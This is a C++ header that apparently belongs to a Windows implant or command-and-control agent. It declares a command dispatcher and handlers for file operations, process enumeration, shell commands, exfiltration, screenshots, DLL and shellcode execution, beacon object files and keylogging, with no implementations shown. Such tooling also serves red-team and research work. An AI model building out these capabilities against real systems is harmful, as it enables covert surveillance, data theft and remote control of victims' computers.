//
// Created by diago on 2024-06-15.
//

#ifndef DISPATCH_HPP
#define DISPATCH_HPP
#include <windows.h>
#include <vector>
#include <cstdint>
#include <winhttp.h>
#include <http.hpp>
#include <sleep.hpp>
#include <io.hpp>
#include <misc.hpp>
#include <filesystem.hpp>
#include <shell.hpp>
#include <injection.hpp>
#include <reconnaissance.hpp>
#include <dispatch.hpp>

namespace dispatch {

    command_output process_command(const std::string& command_str, char delimeter, const implant_context& ctx);
    std::string format_output(const std::string& str);

    command_output pwd(const std::vector<std::string>& args,    const implant_context& ctx);
    command_output cd(const std::vector<std::string>& args,     const implant_context& ctx);
    command_output ls(const std::vector<std::string>& args,     const implant_context& ctx);
    command_output cat(const std::vector<std::string>& args,    const implant_context& ctx);
    command_output whoami(const std::vector<std::string>& args, const implant_context& ctx);
    command_output rm(const std::vector<std::string>& args,     const implant_context& ctx);
    command_output mkdir(const std::vector<std::string>& args,  const implant_context& ctx);
    command_output cp(const std::vector<std::string>& args,     const implant_context& ctx);
    command_output ps(const std::vector<std::string>& args,     const implant_context& ctx);
    command_output cmd(const std::vector<std::string>& args,    const implant_context& ctx);
    command_output getinfo(const std::vector<std::string>& args,const implant_context& ctx);
    command_output procenum(const std::vector<std::string>& args,const implant_context& ctx);
    command_output exfil(const std::vector<std::string>& args,  const implant_context& ctx);
    command_output screenshot(const std::vector<std::string>& args,const implant_context& ctx);
    command_output rundll(const std::vector<std::string> &args,const implant_context& ctx);
    command_output runexe(const std::vector<std::string>& args, const implant_context& ctx);
    command_output runshellcode(const std::vector<std::string>& args,const implant_context& ctx);
    command_output runbof(const std::vector<std::string>& args, const implant_context& ctx);
    command_output keylog(const std::vector<std::string>& args, const implant_context& ctx);
}

#endif //DISPATCH_HPP
